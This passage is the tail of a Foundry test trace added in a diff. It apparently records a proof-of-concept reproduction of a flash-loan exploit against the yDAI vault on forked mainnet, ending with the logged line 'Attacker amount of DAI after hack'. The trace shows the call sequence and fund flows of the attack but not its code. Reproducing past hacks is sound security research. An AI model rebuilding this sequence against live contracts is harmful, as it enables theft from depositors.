+    │   │   │   │   ├─ [2111] 0x0eED07cED0C8c36D4a5bfF44F2536422Bb09BE45::getInterestRate(DAI: [0x6B175474E89094C44Da98b954EedeAC495271d0F], 1304349023930152708453 [1.304e21], 1414550289340267075470830 [1.414e24]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000593b4c
+    │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   ├─ [509] 0x493C57C4763932315A328269E1ADaD09653B9081::balanceOf(yDAI: [0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01]) [staticcall]
+    │   │   │   │   └─ ← [Return] 0
+    │   │   │   ├─ [4773] 0x5d3a536E4D6DbD6114cc1Ead35777bAB948E3643::balanceOf(yDAI: [0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01]) [staticcall]
+    │   │   │   │   ├─ [2257] 0x5d3a536E4D6DbD6114cc1Ead35777bAB948E3643::delegateToImplementation(0x70a0823100000000000000000000000016de59092dae5ccf4a1e6439d611fd0653f0bd01) [staticcall]
+    │   │   │   │   │   ├─ [600] 0x3363BAe2Fc44dA742Df13CD3ee94b6bB868ea376::balanceOf(yDAI: [0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01]) [delegatecall]
+    │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   └─ ← [Return] 0
+    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, value: 911019796329605082651840 [9.11e23])
+    │   │   │   ├─ [602] DAI::balanceOf(yDAI: [0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01]) [staticcall]
+    │   │   │   │   └─ ← [Return] 1052943406217363306950338 [1.052e24]
+    │   │   │   ├─ [3474] DAI::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1032871089248261801129845 [1.032e24])
+    │   │   │   │   ├─ emit Transfer(from: yDAI: [0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 1032871089248261801129845 [1.032e24])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x2f02e106f5b3861b492ce5b389aa055016767262bc75b54222e7a679bd4d603f: 0x00000000000000000000000000000000000000000000def82d2a456e9c5daec2 → 0x0000000000000000000000000000000000000000000004401f5b0fb464a7774d
+    │   │   │   │   │   @ 0x6e10ff27cae71a13525bd61167857e5c982b4674c8e654900e4e9d5035811f78: 0x0000000000000000000000000000000000000000000031a1c07dfdb6ea77a66d → 0x000000000000000000000000000000000000000000010c59ce4d3371222ddde2
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [602] DAI::balanceOf(yDAI: [0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01]) [staticcall]
+    │   │   │   │   └─ ← [Return] 20072316969101505820493 [2.007e22]
+    │   │   │   ├─ [6496] 0xfC1E690f61EFd961294b3e1Ce3313fBD8aa4f85d::balanceOf(yDAI: [0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01]) [staticcall]
+    │   │   │   │   ├─ [3312] 0x3dfd23A6c5E8BbcFc9581d2E864a68feb6a076d3::getReserveNormalizedIncome(DAI: [0x6B175474E89094C44Da98b954EedeAC495271d0F]) [staticcall]
+    │   │   │   │   │   ├─ [2569] 0x2847A5D7Ce69790cb40471d454FEB21A0bE1F2e3::getReserveNormalizedIncome(DAI: [0x6B175474E89094C44Da98b954EedeAC495271d0F]) [delegatecall]
+    │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000003d17cc8d34193c20d3d3d5d
+    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000003d17cc8d34193c20d3d3d5d
+    │   │   │   │   └─ ← [Return] 442188359110421701547003 [4.421e23]
+    │   │   │   ├─ [15172] 0x1E0447b19BB6EcFdAe1e4AE1694b0C3659614e4e::getAccountWei((0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01, 0), 3) [staticcall]
+    │   │   │   │   ├─ [2111] 0x0eED07cED0C8c36D4a5bfF44F2536422Bb09BE45::getInterestRate(DAI: [0x6B175474E89094C44Da98b954EedeAC495271d0F], 1304349023930152708453 [1.304e21], 1414550289340267075470830 [1.414e24]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000593b4c
+    │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   ├─ [509] 0x493C57C4763932315A328269E1ADaD09653B9081::balanceOf(yDAI: [0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01]) [staticcall]
+    │   │   │   │   └─ ← [Return] 0
+    │   │   │   ├─ [4773] 0x5d3a536E4D6DbD6114cc1Ead35777bAB948E3643::balanceOf(yDAI: [0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01]) [staticcall]
+    │   │   │   │   ├─ [2257] 0x5d3a536E4D6DbD6114cc1Ead35777bAB948E3643::delegateToImplementation(0x70a0823100000000000000000000000016de59092dae5ccf4a1e6439d611fd0653f0bd01) [staticcall]
+    │   │   │   │   │   ├─ [600] 0x3363BAe2Fc44dA742Df13CD3ee94b6bB868ea376::balanceOf(yDAI: [0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01]) [delegatecall]
+    │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   └─ ← [Return] 0
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 6: 63530 → 63531
+    │   │   │   │   @ 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03: 0x00000000000000000000000000000000000000000000c0ea7b6c14072ae01cc0 → 0
+    │   │   │   │   @ 7: 0x000000000000000000000000000000000000000000013c9b41624a068ab702bd → 0x0000000000000000000000000000000000000000000061e33393144c5300cb48
+    │   │   │   │   @ 2: 0x0000000000000000000000000000000000000000000117415d69fae90a705d84 → 0x000000000000000000000000000000000000000000005656e1fde6e1df9040c4
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [3474] DAI::transfer(DAIUSDCPool: [0x5777d92f208679DB4b9778590Fa3CAB3aC9e2168], 1240113999000000000000000 [1.24e24])
+    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: DAIUSDCPool: [0x5777d92f208679DB4b9778590Fa3CAB3aC9e2168], value: 1240113999000000000000000 [1.24e24])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x0c851915448d0d1d564ff8d739c8d78544db77078755e108c40f2957369677fa: 0x000000000000000000000000000000000000000000278588b244e8bea26503d2 → 0x000000000000000000000000000000000000000000288c2369346daedf2683d2
+    │   │   │   │   @ 0x6e10ff27cae71a13525bd61167857e5c982b4674c8e654900e4e9d5035811f78: 0x000000000000000000000000000000000000000000010c59ce4d3371222ddde2 → 0x0000000000000000000000000000000000000000000005bf175dae80e56c5de2
+    │   │   │   └─ ← [Return] true
+    │   │   └─ ← [Stop]
+    │   ├─ [602] DAI::balanceOf(DAIUSDCPool: [0x5777d92f208679DB4b9778590Fa3CAB3aC9e2168]) [staticcall]
+    │   │   └─ ← [Return] 49018817309034167759438802 [4.901e25]
+    │   ├─ [1315] CentreUSDC::balanceOf(DAIUSDCPool: [0x5777d92f208679DB4b9778590Fa3CAB3aC9e2168]) [staticcall]
+    │   │   ├─ [529] 0xa2327a938Febf5FEC13baCFb16Ae10EcBc4cbDCF::balanceOf(DAIUSDCPool: [0x5777d92f208679DB4b9778590Fa3CAB3aC9e2168]) [delegatecall]
+    │   │   │   └─ ← [Return] 58894222347232 [5.889e13]
+    │   │   └─ ← [Return] 58894222347232 [5.889e13]
+    │   ├─ emit Flash(sender: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], recipient: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], qty0: 1239990000000000000000000 [1.239e24], qty1: 0, paid0: 123999000000000000000 [1.239e20], paid1: 0)
+    │   ├─  storage changes:
+    │   │   @ 1: 0x000000000000000000000000000000454208b0b8f59fd66206dda3b9d4bb582b → 0x000000000000000000000000000000454217d2f01f0c18f4dd48990d73201985
+    │   └─ ← [Stop]
+    ├─ [602] DAI::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   └─ ← [Return] 27136844226131084991970 [2.713e22]
+    ├─ [240] DAI::decimals() [staticcall]
+    │   └─ ← [Return] 18
+    ├─ emit log_named_decimal_uint(key: "Attacker amount of DAI after hack", val: 27136844226131084991970 [2.713e22], decimals: 18)
+    └─ ← [Stop]
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 46.33s (44.96s CPU time)
+
+Ran 1 test suite in 46.90s (46.33s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
